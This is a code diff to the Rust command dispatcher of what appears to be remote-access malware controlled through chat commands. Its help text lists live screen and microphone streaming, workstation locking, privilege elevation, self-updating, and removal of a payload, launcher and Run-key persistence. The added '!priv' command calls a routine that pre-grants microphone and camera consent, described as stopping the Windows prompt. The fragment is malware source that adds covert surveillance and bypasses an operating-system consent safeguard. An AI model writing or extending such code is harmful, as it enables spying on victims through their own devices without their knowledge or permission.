@@ -61,6 +61,7 @@ const HELP: &str = "\
 !screenshare               join voice + share the screen live
 !voice                     join voice + stream the microphone live
 !vc stop                   stop a live voice stream
+!priv                      pre-grant mic/camera consent (stops the Windows prompt)
 !lock                      lock workstation
 !update                    pull newest build from #update and restart
 !uninstall                 remove payload + launcher + Run key, then stop
@@ -672,6 +673,10 @@ pub async fn dispatch(
             } else {
                 st.send(console, "usage: !vc stop").await?;
             }
+        }
+        "priv" | "consent" | "allowmic" => {
+            let r = tokio::task::spawn_blocking(host::privacy_allow).await??;
+            st.send_code(console, &r).await?;
         }
         "uac" | "elevate" => {
             let a = arg.trim().to_ascii_lowercase();
